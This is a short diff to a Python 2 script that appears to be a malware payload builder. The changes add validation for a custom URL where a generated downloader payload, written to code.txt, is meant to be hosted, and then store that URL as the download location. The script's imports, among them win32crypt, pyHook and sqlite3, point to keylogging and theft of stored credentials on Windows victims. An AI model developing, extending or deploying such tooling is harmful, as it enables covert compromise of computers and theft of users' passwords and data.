@@ -72,6 +72,11 @@ if args.expire:
 		print ' [X] Error: Missing or invalid expire flag value: %s\n' % args.expire
 		parser.print_help()
 		exit()
+else:
+	if args.customurl[:4] != 'http':
+		print ' [X] Error: Cutom url must be formatted: http\n'
+		parser.print_help()
+		exit()
 
 if args.hostname and args.port:
 	hostname = args.hostname
@@ -163,6 +168,7 @@ else:
 		lf.write(downpayload)
 	print ' [V] Payload code written to code.txt'
 	print ' [V] Expecting it to be hosted at ' + args.customurl
+	downurl = args.customurl
 
 myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests', 'sys']
 mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
